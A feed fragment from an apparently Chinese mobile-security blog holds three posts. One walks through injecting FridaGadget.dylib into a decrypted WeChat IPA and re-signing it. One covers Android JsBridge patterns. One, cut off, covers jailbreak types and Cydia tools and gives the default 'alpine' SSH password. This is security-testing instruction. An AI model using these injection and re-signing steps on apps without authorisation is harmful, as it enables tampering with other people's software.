        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>frida-server在运行时需要root环境，但如果没有越狱的设备，依然可以使用frida,我们只需要重打包ipa文件，将frida运行库注入ipa文件中，app在启动时会自动加载frida运行库，即可实现在非越狱的设备上使用Frida.</p><p>由于苹果的混淆策略和代码签名，重打包app的难度很高，一些自动重打包的工具如Objection、IPAPatch等简化了重打包过程，但其本质大概相同，以下分步介绍手动重打包frida运行库的过程。</p><h2 id="1-配置optool和ios-deploy"><a href="#1-配置optool和ios-deploy" class="headerlink" title="1. 配置optool和ios-deploy"></a>1. 配置optool和ios-deploy</h2><p>optool可以将一个外部的lib插入到Mach-O文件头，使binary文件在启动时会自动加载该lib。如已经配置过，直接跳过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/alexzielenski/optool.git</span><br><span class="line">$ cd optool/</span><br><span class="line">$ git submodule update --init --recursive</span><br><span class="line">$ xcodebuild</span><br><span class="line">$ ln -s &lt;your-path-to-optool&gt;/build/Release/optool /usr/local/bin/optool</span><br></pre></td></tr></table></figure></p><p>ios-deploy可以在不用Xcode的前提下调试和部署APP:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/phonegap/ios-deploy.git</span><br><span class="line">$ cd ios-deploy/</span><br><span class="line">$ xcodebuild</span><br><span class="line">$ cd build/Release</span><br><span class="line">$ ./ios-deploy</span><br><span class="line">$ ln -s &lt;your-path-to-ios-deploy&gt;/build/Release/ios-deploy /usr/local/bin/ios-deploy</span><br></pre></td></tr></table></figure></p><p>更新bashrc文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zsh: # . ~/.zshrc</span><br><span class="line">bash: # . ~/.bashrc</span><br></pre></td></tr></table></figure></p><h2 id="2-准备FridaGadget-dylib"><a href="#2-准备FridaGadget-dylib" class="headerlink" title="2.准备FridaGadget.dylib"></a>2.准备FridaGadget.dylib</h2><p>FridaGadget.dylib会不断更新，历史版本在<a href="https://github.com/frida/frida/releases中下载" target="_blank" rel="noopener">https://github.com/frida/frida/releases中下载</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://build.frida.re/frida/ios/lib/FridaGadget.dylib</span><br></pre></td></tr></table></figure></p><h2 id="3-重打包"><a href="#3-重打包" class="headerlink" title="3.重打包"></a>3.重打包</h2><h3 id="1-解压ipa文件-ipa必须为砸壳后的文件-，复制FridaGadget-dylib到app目录，使用optool添加到binary文件"><a href="#1-解压ipa文件-ipa必须为砸壳后的文件-，复制FridaGadget-dylib到app目录，使用optool添加到binary文件" class="headerlink" title="1.解压ipa文件(ipa必须为砸壳后的文件)，复制FridaGadget.dylib到app目录，使用optool添加到binary文件"></a>1.<strong>解压ipa文件(ipa必须为砸壳后的文件)，复制FridaGadget.dylib到app目录，使用optool添加到binary文件</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">unzip wechat.ipa</span><br><span class="line">$ cp FridaGadget.dylib Payload/WeChat.app/</span><br><span class="line">$ optool install -c load -p &quot;@executable_path/FridaGadget.dylib&quot;  -t Payload/WeChat.app/WeChat</span><br><span class="line"></span><br><span class="line">Found FAT Header</span><br><span class="line">Found thin header...</span><br><span class="line">Found thin header...</span><br><span class="line">Inserting a LC_LOAD_DYLIB command for architecture: arm</span><br><span class="line">Successfully inserted a LC_LOAD_DYLIB command for arm</span><br><span class="line">Inserting a LC_LOAD_DYLIB command for architecture: arm64</span><br><span class="line">Successfully inserted a LC_LOAD_DYLIB command for arm64</span><br><span class="line">Writing executable to Payload/WeChat.app/WeChat...</span><br></pre></td></tr></table></figure><h3 id="2-替换provisioning-profile文件"><a href="#2-替换provisioning-profile文件" class="headerlink" title="2.替换provisioning profile文件"></a>2.<strong>替换provisioning profile文件</strong></h3><p>由于在binary中注入了frida，破坏了原有的代码签名，无法在iOS设备上运行，因此需要重新签名。首先，添加自己的provisioning profile文件。</p><p>自己的provisioning profile可以通过新建一个xcode工程，(provisioning profile有效期为7天，所以每次尽量新建一个空的工程，并在设备上运行)从.app文件中提取，路径为~/Library/Developer/Xcode/DerivedData/xxxxxxx/Build/Products/Debug-iphoneos/xxxxxxx.app/。或者通过xcode界面定位到.app文件:</p><blockquote><p>   打开Xcode，创建一个SimpleViewApp<br>    运行环境选中你的设备，运行一次<br>    选中左边导航栏Products中的app<br>    点击最右面板中，Full Path右下角的箭头，定位到app所在的目录<br>    右击app选择“显示包内容”，即可看到embedded.mobileprovision</p></blockquote><p>对于获取到的provisioning profile，可以用security命令验证是否正确。除了检查允许的证书、设备外，entitlements文件在代码签名中也会用到，所以需要把其提取为一个单独的plist文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ security cms -D -i AwesomeRepackaging.mobileprovision &gt; profile.plist</span><br><span class="line">$ /usr/libexec/PlistBuddy -x -c &apos;Print :Entitlements&apos; profile.plist &gt; entitlements.plist</span><br><span class="line">$ cat entitlements.plist</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span><br><span class="line">&lt;plist version=&quot;1.0&quot;&gt;</span><br><span class="line">&lt;dict&gt;</span><br><span class="line">&lt;key&gt;application-identifier&lt;/key&gt;</span><br><span class="line">&lt;string&gt;LRUD9L355Y.sg.vantagepoint.repackage&lt;/string&gt;</span><br><span class="line">&lt;key&gt;com.apple.developer.team-identifier&lt;/key&gt;</span><br><span class="line">&lt;string&gt;LRUD9L355Y&lt;/string&gt;</span><br><span class="line">&lt;key&gt;get-task-allow&lt;/key&gt;</span><br><span class="line">&lt;true/&gt;</span><br><span class="line">&lt;key&gt;keychain-access-groups&lt;/key&gt;</span><br><span class="line">&lt;array&gt;</span><br><span class="line">&lt;string&gt;LRUD9L355Y.*&lt;/string&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;/dict&gt;</span><br><span class="line">&lt;/plist&gt;</span><br></pre></td></tr></table></figure></p><p>需要注意的是：</p><ol><li>application identifier字段是由Team ID (LRUD9L355Y) 和Bundle ID (sg.vantagepoint.repackage)构成，Bundle ID必须和Info.plist的bundle id匹配</li><li>“get-task-allow”必须为true，否则其他进程无法attach</li></ol><p>确定provisioning profile有效后，我们将其复制到工程目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cp my.mobileprovision Payload/WeChat.app/embedded.mobileprovision</span><br></pre></td></tr></table></figure></p><p>更新Info.plist中的bundle ID：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/libexec/PlistBuddy -c &quot;Set :CFBundleIdentifier m4bln.myapp&quot; Payload/WeChat.app/Info.plist</span><br></pre></td></tr></table></figure></p><h3 id="3-移除原有签名"><a href="#3-移除原有签名" class="headerlink" title="3.移除原有签名"></a>3.<strong>移除原有签名</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ rm -rf Payload/WeChat.app/_CodeSignature</span><br></pre></td></tr></table></figure><h3 id="4-重新签名"><a href="#4-重新签名" class="headerlink" title="4.重新签名"></a>4.<strong>重新签名</strong></h3><p>对FridaGadget.dylib签名，其中的”8004380F331DCA22CC1B47FB1A805890AE41C938”需要替换为自己的哈希，可以通过“security find-identity -p codesigning -v”命令获取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938  Payload/WeChat.app/FridaGadget.dylib</span><br><span class="line"></span><br><span class="line">Payload/WeChat.app/FridaGadget.dylib: replacing existing signature</span><br></pre></td></tr></table></figure></p><p>使用entitlements.plist对binary文件进行签名：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ /usr/bin/codesign --force --sign 8004380F331DCA22CC1B47FB1A805890AE41C938 --entitlements entitlements.plist Payload/WeChat.app/WeChat</span><br><span class="line"></span><br><span class="line">Payload/WeChat.app/WeChat: replacing existing signature</span><br></pre></td></tr></table></figure></p><h2 id="安装和运行app"><a href="#安装和运行app" class="headerlink" title="安装和运行app"></a>安装和运行app</h2><p>使用ios-deploy安装和运行app<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ios-deploy --debug --bundle Payload/WeChat.app/</span><br></pre></td></tr></table></figure></p><p>运行frida-ps -U验证是否可以attach：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ frida-ps -U</span><br><span class="line">PID  Name</span><br><span class="line">---  ------</span><br><span class="line">499  Gadget</span><br></pre></td></tr></table></figure></p><h2 id="测试Frida"><a href="#测试Frida" class="headerlink" title="测试Frida"></a>测试Frida</h2><p>运行一段frida脚本，实现在界面上弹窗:<br>注： attach时需要根据frida-ps获得的进程pid设置attach参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import frida</span><br><span class="line">#</span><br><span class="line">#JavaScript to be injected</span><br><span class="line">frida_code = &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">// Defining a Block that will be passed as handler parameter to +[UIAlertAction actionWithTitle:style:handler:]</span><br><span class="line">var handler = new ObjC.Block(&#123;</span><br><span class="line">  retType: &apos;void&apos;,</span><br><span class="line">  argTypes: [&apos;object&apos;],</span><br><span class="line">  implementation: function () &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// Import ObjC classes</span><br><span class="line">var UIAlertController = ObjC.classes.UIAlertController;</span><br><span class="line">var UIAlertAction = ObjC.classes.UIAlertAction;</span><br><span class="line">var UIApplication = ObjC.classes.UIApplication;</span><br><span class="line"></span><br><span class="line">// Using Grand Central Dispatch to pass messages (invoke methods) in application&apos;s main thread</span><br><span class="line">ObjC.schedule(ObjC.mainQueue, function () &#123;</span><br><span class="line">  // Using integer numerals for preferredStyle which is of type enum UIAlertControllerStyle</span><br><span class="line">  var alert = UIAlertController.alertControllerWithTitle_message_preferredStyle_(&apos;Frida&apos;, &apos;Hello from Frida&apos;, 1);</span><br><span class="line">  // Again using integer numeral for style parameter that is enum</span><br><span class="line">  var defaultAction = UIAlertAction.actionWithTitle_style_handler_(&apos;OK&apos;, 0, handler);</span><br><span class="line">  alert.addAction_(defaultAction);</span><br><span class="line">  // Instead of using `ObjC.choose()` and looking for UIViewController instances</span><br><span class="line">  // on the heap, we have direct access through UIApplication:</span><br><span class="line">  UIApplication.sharedApplication().keyWindow().rootViewController().presentViewController_animated_completion_(alert, true, NULL);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">process = frida.get_usb_device().attach(499)</span><br><span class="line">script = process.create_script(frida_code)</span><br><span class="line">#script.on(&apos;message&apos;, message_callback)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p>运行截图如下：</p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p>参考文献：</p><ol><li>iOS App的Patching和Resigning <a href="https://www.jianshu.com/p/ce2770c42ead" target="_blank" rel="noopener">https://www.jianshu.com/p/ce2770c42ead</a></li><li><a href="https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md" target="_blank" rel="noopener">https://github.com/OWASP/owasp-mstg/blob/master/Document/0x06b-Basic-Security-Testing.md</a></li><li><a href="https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/" target="_blank" rel="noopener">https://www.nccgroup.trust/au/about-us/newsroom-and-events/blogs/2016/october/ios-instrumentation-without-jailbreak/</a></li><li>如何重新打包并签名iOS应用 <a href="https://www.anquanke.com/post/id/152952" target="_blank" rel="noopener">https://www.anquanke.com/post/id/152952</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android JsBridge</title>
      <link href="/2018/06/11/Android-JsBridge/"/>
      <url>/2018/06/11/Android-JsBridge/</url>
      
        <content type="html"><![CDATA[<p>Android客户端中经常会遇到js调用java代码的场景，例如一些Hybrid APP或H5等，JsBridge即通过js调用java或者通过java调用js函数。</p><h1 id="java调用js"><a href="#java调用js" class="headerlink" title="java调用js"></a>java调用js</h1><h2 id="1-webview的loadUrl"><a href="#1-webview的loadUrl" class="headerlink" title="1. webview的loadUrl"></a>1. webview的loadUrl</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WebView.loadUrl(&quot;javascript:function()&quot;);</span><br></pre></td></tr></table></figure><h2 id="2-webview的evaluateJavascript"><a href="#2-webview的evaluateJavascript" class="headerlink" title="2. webview的evaluateJavascript"></a>2. webview的evaluateJavascript</h2><p>使用evaluateJavascript可以获得js函数的返回值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mWebView.evaluateJavascript(&quot;javascript:callJS()&quot;, new ValueCallback&lt;String&gt;() &#123;</span><br><span class="line">        @Override</span><br><span class="line">        public void onReceiveValue(String value) &#123;</span><br><span class="line">            //此处为 js 返回的结果</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h1 id="js调用Java"><a href="#js调用Java" class="headerlink" title="js调用Java"></a>js调用Java</h1><p>Android中js调用java通常有以下几种做法：</p><h2 id="1-通过WebView的addJavascriptInterface（）进行对象映射"><a href="#1-通过WebView的addJavascriptInterface（）进行对象映射" class="headerlink" title="1. 通过WebView的addJavascriptInterface（）进行对象映射"></a>1. 通过WebView的addJavascriptInterface（）进行对象映射</h2><p>定义一个与JS对象映射关系的Android类：AndroidtoJs,在Android里通过WebView设置Android类与JS代码的映射</p><p>java代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mWebView.addJavascriptInterface(new AndroidtoJs(), &quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class AndroidtoJs extends Object &#123;</span><br><span class="line"></span><br><span class="line">    // 定义JS需要调用的方法</span><br><span class="line">    // 被JS调用的方法必须加入@JavascriptInterface注解</span><br><span class="line">    @JavascriptInterface</span><br><span class="line">    public void hello(String msg) &#123;</span><br><span class="line">        System.out.println(&quot;JS调用了Android的hello方法&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>js端代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function callAndroid()&#123;</span><br><span class="line">   // 由于对象映射，所以调用test对象等于调用Android映射的对象</span><br><span class="line">   test.hello(&quot;js调用了android中的hello方法&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><h2 id="2-通过-WebViewClient-的shouldOverrideUrlLoading-方法回调拦截-url"><a href="#2-通过-WebViewClient-的shouldOverrideUrlLoading-方法回调拦截-url" class="headerlink" title="2. 通过 WebViewClient 的shouldOverrideUrlLoading ()方法回调拦截 url"></a>2. 通过 WebViewClient 的shouldOverrideUrlLoading ()方法回调拦截 url</h2><p>实现逻辑如下：</p><ul><li>Android通过 WebViewClient 的回调方法shouldOverrideUrlLoading ()拦截 url</li><li>解析该 url 的协议</li><li>如果检测到是预先约定好的协议，就调用相应方法</li></ul><p>java端代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">webview.setWebViewClient(new WebViewClient()&#123;</span><br><span class="line"></span><br><span class="line">            @Override</span><br><span class="line">            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) &#123;</span><br><span class="line"></span><br><span class="line">                String url=&quot;&quot;;</span><br><span class="line">                try&#123;</span><br><span class="line"></span><br><span class="line">                    if (Build.VERSION.SDK_INT &gt; 21) &#123;</span><br><span class="line">                        url = request.getUrl().toString();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    if(url.startsWith(&quot;m4bln://&quot;))&#123;</span><br><span class="line">                    // 实现自己代码</span><br><span class="line">                        Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));</span><br><span class="line">                        startActivity(intent);</span><br><span class="line">                        return true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;catch (Exception e)&#123;</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">                view.loadUrl(url);</span><br><span class="line">                return true;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></p><p>触发shouldOverrideUrlLoading的代码参照《Web调起App》</p><h2 id="3-通过-WebChromeClient-的onJsAlert-、onJsConfirm-、onJsPrompt（）、onConsoleMessage（）方法回调拦截JS对话框alert-、confirm-、prompt-、console-log-消息"><a href="#3-通过-WebChromeClient-的onJsAlert-、onJsConfirm-、onJsPrompt（）、onConsoleMessage（）方法回调拦截JS对话框alert-、confirm-、prompt-、console-log-消息" class="headerlink" title="3. 通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）、onConsoleMessage（）方法回调拦截JS对话框alert()、confirm()、prompt()、console.log()消息"></a>3. 通过 WebChromeClient 的onJsAlert()、onJsConfirm()、onJsPrompt（）、onConsoleMessage（）方法回调拦截JS对话框alert()、confirm()、prompt()、console.log()消息</h2><p>常用的拦截是：拦截 JS的输入框（即prompt（）方法）<br>因为只有prompt（）可以返回任意类型的值，操作最全面方便、更加灵活；而alert（）对话框没有返回值；confirm（）对话框只能返回两种状态（确定 / 取消）两个值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">mWebView.setWebChromeClient(new WebChromeClient() &#123;</span><br><span class="line">    // 拦截输入框</span><br><span class="line">    // 参数message:代表promt（）的内容（不是url）</span><br><span class="line">    // 参数result:代表输入框的返回值</span><br><span class="line">    @Override</span><br><span class="line">    public boolean onJsPrompt(WebView view, String url, String message, String defaultValue, JsPromptResult result) &#123;</span><br><span class="line">        // 根据协议的参数，判断是否是所需要的url(原理同方式2)</span><br><span class="line">        // 一般根据scheme（协议格式） &amp; authority（协议名）判断（前两个参数）</span><br><span class="line">        //假定传入进来的 url = &quot;js://webview?arg1=111&amp;arg2=222&quot;（同时也是约定好的需要拦截的）</span><br><span class="line"></span><br><span class="line">        Uri uri = Uri.parse(message);</span><br><span class="line">        // 如果url的协议 = 预先约定的 js 协议</span><br><span class="line">        // 就解析往下解析参数</span><br><span class="line">        if ( uri.getScheme().equals(&quot;js&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">            // 如果 authority  = 预先约定协议里的 webview，即代表都符合约定的协议</span><br><span class="line">            // 所以拦截url,下面JS开始调用Android需要的方法</span><br><span class="line">            if (uri.getAuthority().equals(&quot;webview&quot;)) &#123;</span><br><span class="line"></span><br><span class="line">                //</span><br><span class="line">                // 执行JS所需要调用的逻辑</span><br><span class="line">                System.out.println(&quot;js调用了Android的方法&quot;);</span><br><span class="line">                // 可以在协议上带有参数并传递到Android上</span><br><span class="line">                HashMap&lt;String, String&gt; params = new HashMap&lt;&gt;();</span><br><span class="line">                Set&lt;String&gt; collection = uri.getQueryParameterNames();</span><br><span class="line"></span><br><span class="line">                //参数result:代表消息框的返回值(输入值)</span><br><span class="line">                result.confirm(&quot;js调用了Android的方法成功啦&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return super.onJsPrompt(view, url, message, defaultValue, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean onConsoleMessage(ConsoleMessage consoleMessage)&#123;</span><br><span class="line">        String message = consoleMessage.message();</span><br><span class="line">        Toast.makeText(getBaseContext(),message,Toast.LENGTH_LONG).show();</span><br><span class="line">        return  super.onConsoleMessage(consoleMessage);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean onJsConfirm (WebView view,String url,String message,JsResult result)&#123;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(getBaseContext(),&quot;onJsConfirm m4bln&quot;,Toast.LENGTH_LONG).show();</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="几种方法对比"><a href="#几种方法对比" class="headerlink" title="几种方法对比"></a>几种方法对比</h1><p><img src="/images/pasted-36.png" alt="upload successful"></p><h1 id="JsBridge接口封装"><a href="#JsBridge接口封装" class="headerlink" title="JsBridge接口封装"></a>JsBridge接口封装</h1><ul><li><p>实现简单的注册接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSBridge.register(&quot;ClassName&quot;,javaClass.class)</span><br></pre></td></tr></table></figure></li><li><p>通过反射调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public static boolean callJavaMethod(String className, String methodName, Object... params) &#123;</span><br><span class="line">        ......</span><br><span class="line">        Method method = classNameLists.get(methodName);</span><br><span class="line">        ......</span><br><span class="line">        try &#123;</span><br><span class="line">            method.invoke(null, params);</span><br><span class="line">            return true;</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>避免混淆</p></li></ul><p>为了避免混淆时class名字改变，所有的类可以注册一个空接口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public interface IBridge&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时在混淆文件中加入以下代码，就可以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-keep public class * implements com.myapp.jsbridge.IBridge&#123;*;&#125;</span><br><span class="line">-keepclasseswithmembernames public class * implements com.myapp.jsbridge.IBridge&#123;*;&#125;</span><br></pre></td></tr></table></figure></p><p>参考sdk</p><ol><li><a href="https://github.com/lzyzsd/JsBridge" target="_blank" rel="noopener">https://github.com/lzyzsd/JsBridge</a> （<a href="https://github.com/lzyzsd/JsBridge）" target="_blank" rel="noopener">https://github.com/lzyzsd/JsBridge）</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>iOS应用安全—— 基础篇</title>
      <link href="/2018/05/31/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%EF%BC%88%E5%BE%85%EF%BC%89/"/>
      <url>/2018/05/31/iOS%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%EF%BC%88%E5%BE%85%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="越狱"><a href="#越狱" class="headerlink" title="越狱"></a>越狱</h2><p>几种类型的越狱：</p><ul><li>Tethered jailbreaks 不完美越狱，重启后无法保留 </li><li>Semi-tethered jailbreaks  半完美越狱，必须通过连接电脑越狱，<strong>设备启动后会自动进入非越狱模式</strong></li><li>Semi-untethered jailbreaks 半完美越狱，设备启动能自己进入到越狱模式，但<strong>内核的代码签名校验不会被自动禁用</strong>，需要通过启动一个应用完成</li><li>Untethered jailbreaks 完美越狱，一次越狱后即可永久越狱</li></ul><p>注意：<br>如果设备已经越狱，切勿升级系统，否则会丢失越狱</p><p>根据iOS版本判断设备是否可以越狱：<br><a href="https://canijailbreak.com/" target="_blank" rel="noopener">Can I Jailbreak? https://canijailbreak.com/</a></p><p>几个iPhone越狱相关的资源：</p><ul><li><a href="https://www.theiphonewiki.com/" target="_blank" rel="noopener">The iPhone Wiki</a></li><li><a href="https://www.reddit.com/r/jailbreak/" target="_blank" rel="noopener">Reddit Jailbreak</a></li></ul><h2 id="Cydia"><a href="#Cydia" class="headerlink" title="Cydia"></a>Cydia</h2><p>通常在越狱完成后会自动安装Cydia，下面介绍几个在Cydia下需要安装的工具：</p><ol><li>openssh<br>默认的ssh账号是root，默认密码为alpine</li><li>Frida<br>在Cydia中添加源 <a href="https://build.frida.re后直接搜索安装" target="_blank" rel="noopener">https://build.frida.re后直接搜索安装</a></li><li>BigBoss Recommended Tools<br>unix命令行工具，iOS系统不提供，如wget, unrar, less,sqlite3等</li><li>Class 